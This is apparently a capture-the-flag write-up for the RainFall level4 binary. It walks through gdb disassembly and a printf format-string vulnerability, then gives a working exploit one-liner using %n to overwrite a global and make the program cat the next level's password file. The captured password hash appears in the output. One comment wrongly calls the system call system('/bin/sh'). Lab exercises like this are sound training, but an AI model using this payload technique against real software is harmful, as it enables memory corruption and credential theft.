```sh
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n> # call n()
   0x080484b2 <+11>:    leave  
   0x080484b3 <+12>:    ret    
End of assembler dump.
```

```sh
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax # move stdin into eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)  # move eax into esp + 8
   0x08048469 <+18>:    movl   $0x200,0x4(%esp) # move 0x200 (512) into esp + 4
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax # allocate local buffer[520]
   0x08048477 <+32>:    mov    %eax,(%esp) # move the buffer to esp
   0x0804847a <+35>:    call   0x8048350 <fgets@plt> #call fgets(buffer, 512, stdin)
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax # move the buffer back to eax
   0x08048485 <+46>:    mov    %eax,(%esp) # send the buffer to esp
   0x08048488 <+49>:    call   0x8048444 <p> # call p(buffer)
   0x0804848d <+54>:    mov    0x8049810,%eax # move a global variable into %eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax # Compare 16930116 with the global variable
   0x08048497 <+64>:    jne    0x80484a5 <n+78> # return if gloabal_var != 16930116
   0x08048499 <+66>:    movl   $0x8048590,(%esp) # move "/bin/cat /home/user/level5/.pass" into eax
   0x080484a0 <+73>:    call   0x8048360 <system@plt> # call system("/bin/sh")
   0x080484a5 <+78>:    leave  
   0x080484a6 <+79>:    ret    
End of assembler dump.
```

```sh
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax #move the argument (buffer) into eax
   0x0804844d <+9>:     mov    %eax,(%esp) #move eax to esp
   0x08048450 <+12>:    call   0x8048340 <printf@plt> #call printf(buffer)
   0x08048455 <+17>:    leave  
   0x08048456 <+18>:    ret    
End of assembler dump.
```

```sh
(gdb) b *0x08048455
Breakpoint 1 at 0x8048455
(gdb) r
Starting program: /home/user/level4/level4 
AAAA
AAAA

Breakpoint 1, 0x08048455 in p ()
(gdb) x/20x $esp
0xbffff4f0:     0xbffff520      0xb7ff26b0      0xbffff764      0xb7fd0ff4 # 0 - 3
0xbffff500:     0x00000000      0x00000000      0xbffff728      0x0804848d # 4 - 7
0xbffff510:     0xbffff520      0x00000200      0xb7fd1ac0      0xb7ff37d0 # 8 - 11
0xbffff520:   **0x41414141**    0xb7e2000a      0x00000001      0xb7fef305 # 12 - 15
0xbffff530:     0xbffff588      0xb7fde2d4      0xb7fde334      0x00000007 # 16 - 19
(gdb) x/s $esp + 48 # 12 * 4 (position * size)
0xbffff520:      "AAAA\n"
```

- `\x10\x98\x04\x08` address of the variable we want to overwrite
- `%16930112x` print 16930112 filler characters (16930112 + 4 characters of the address = 16930116)
- `%12$n` Write the sum of all the characters into the 12th argument which is `\x10\x98\x04\x08`

```sh
level4@RainFall:~$ python -c "print('\x10\x98\x04\x08' + '%16930112x' + '%12\$n')" | ./level4


                          b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```